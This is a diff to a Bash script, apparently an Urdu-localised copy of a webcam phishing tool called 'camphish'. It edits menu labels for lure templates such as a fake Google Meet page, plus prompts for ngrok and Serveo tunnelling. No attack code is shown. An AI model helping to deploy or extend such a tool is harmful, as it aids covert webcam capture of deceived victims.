@@ -148,7 +148,7 @@ else
 printf "\n-----template ka intekhaab kre----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Google Meeting\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] template ka intekhaab kre: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
@@ -209,7 +209,7 @@ read -p $'\n\e[1;92m[\e[0m+\e[1;92m] kya ap ngrok authtoken tabdeel krna chahte 
 if [[ $chg_token == "Y" || $chg_token == "y" || $cchg_token == "Yes" || $cchg_token == "yes" ]]; then
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Authtoken tabdeel.kiya jaa chuka hai \n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken tabdeel kiya jaa chuka hai\n"
 fi
 else
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] ngrok ke valid authtoken ka inderaaj kejeye: \e[0m' ngrok_auth
@@ -246,7 +246,7 @@ printf "\n-----tumnel server ka intekhaab kejeye----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option ka intekhaab kejeye: [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Port Forwarding option ka intekhaab kejeye: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
@@ -257,7 +257,7 @@ start
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] options ghalat hai!\e[0m\n"
+printf "\e[1;93m [!] option ghalat hai!\e[0m\n"
 sleep 1
 clear
 camphish
